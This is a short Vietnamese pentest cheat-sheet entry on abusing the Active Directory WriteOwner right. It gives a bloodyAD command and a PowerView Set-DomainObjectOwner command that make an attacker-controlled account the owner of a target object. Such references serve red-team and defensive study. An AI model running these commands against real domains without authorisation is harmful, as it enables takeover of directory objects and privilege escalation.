# WriteOwner

Thay đổi chủ sở hữu của đối tượng mục tiêu trong Active Directory để kiểm soát hoàn toàn đối tượng, cho phép thực hiện mọi thao tác trên đối tượng.

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD --host <dc_ip> -d <domain> -u <attackeruser> -p '<pass>' set owner <targetobject> <attackeruser>
```

{% endcode %}

#### Windows Only

{% code overflow="wrap" %}

```
Set-DomainObjectOwner -Identity '<targetobject>' -OwnerIdentity '<controlledprincipal>'
```

{% endcode %}
